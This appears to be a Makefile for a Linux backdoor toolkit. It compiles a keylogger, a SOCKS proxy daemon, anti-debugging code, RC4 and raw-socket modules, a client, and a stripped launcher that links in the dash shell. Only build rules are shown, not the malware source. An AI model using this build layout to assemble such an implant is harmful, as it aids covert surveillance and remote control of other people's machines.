CC  =   ../../dietlibc/bin/diet gcc
CFLAGS = -Wall -fno-builtin -I../include -fomit-frame-pointer -nostdinc -DNODIETREF -I../../dietlibc/include -I../../dietlibc/ $(EXTRA_CFLAGS) 
LDFLAGS = -s
DASH = ../../dash/src/alias.o ../../dash/src/arith_yacc.o ../../dash/src/arith_yylex.o ../../dash/src/cd.o \
		../../dash/src/error.o ../../dash/src/eval.o ../../dash/src/exec.o ../../dash/src/expand.o \
		../../dash/src/histedit.o ../../dash/src/input.o ../../dash/src/jobs.o ../../dash/src/mail.o \
		../../dash/src/dash_main.o ../../dash/src/memalloc.o ../../dash/src/miscbltin.o ../../dash/src/mystring.o \
		../../dash/src/options.o ../../dash/src/parser.o ../../dash/src/redir.o ../../dash/src/show.o ../../dash/src/trap.o \
		../../dash/src/output.o ../../dash/src/printf.o ../../dash/src/system.o ../../dash/src/test.o ../../dash/src/times.o \
		../../dash/src/var.o ../../dash/src/builtins.o ../../dash/src/init.o ../../dash/src/nodes.o ../../dash/src/signames.o \
		../../dash/src/syntax.o 
all: config client launcher keylogger socksd

keylogger: keylogger.c antidebug.o
	$(CC) $(CFLAGS) $(LDFLAGS) -D STANDALONE keylogger.c antidebug.o -o keylogger

keylogger.o: keylogger.c
	$(CC) $(CFLAGS) $(LDFLAGS) -c keylogger.c -o keylogger.o

socksd: socksd.c
	$(CC) $(CFLAGS) $(LDFLAGS) -D STANDALONE common.o socksd.c -o socksd

socksd.o: socksd.c
	$(CC) $(CFLAGS) $(LDFLAGS) -c socksd.c -o socksd.o

common.o: common.c ../include/config.h ../include/common.h
	$(CC) $(CFLAGS) $(LDFLAGS) -c common.c -o common.o

antidebug.o: antidebug.c ../include/config.h
	$(CC) $(CFLAGS) $(LDFLAGS) -c antidebug.c -o antidebug.o

rc4.o: rc4.c ../include/rc4.h
	$(CC) $(CFLAGS) $(LDFLAGS) -c rc4.c -o rc4.o

config: config.c sha1.o 
	$(CC) $(CFLAGS) $(LDFLAGS) config.c sha1.o -o config

client: client.c common.o ../include/config.h sha1.o raw.o rc4.o antidebug.o
	$(CC) $(CFLAGS) $(LDFLAGS) client.c sha1.o common.o antidebug.o raw.o rc4.o -o client

launcher: launcher.c common.o antidebug.o ../include/config.h raw.o rc4.o $(DASH) keylogger.o socksd.o
	$(CC) $(CFLAGS) $(LDFLAGS) launcher.c raw.o common.o antidebug.o rc4.o $(DASH) keylogger.o socksd.o ../../dietlibc/bin/libcompat.a -D DASH -o launcher

../include/config.h: config
	./config > ../include/config.h

sha1.o: sha1.c ../include/sha1.h
	$(CC) $(CFLAGS) $(LDFLAGS) -c sha1.c -o sha1.o

raw.o: raw.c ../include/raw.h
	$(CC) $(CFLAGS) $(LDFLAGS) -c raw.c -o raw.o

cleanall:
	rm -f *.o ../include/config.h launcher client config *.o socksd keylogger

clean:
	rm -f *.o launcher client config socksd keylogger


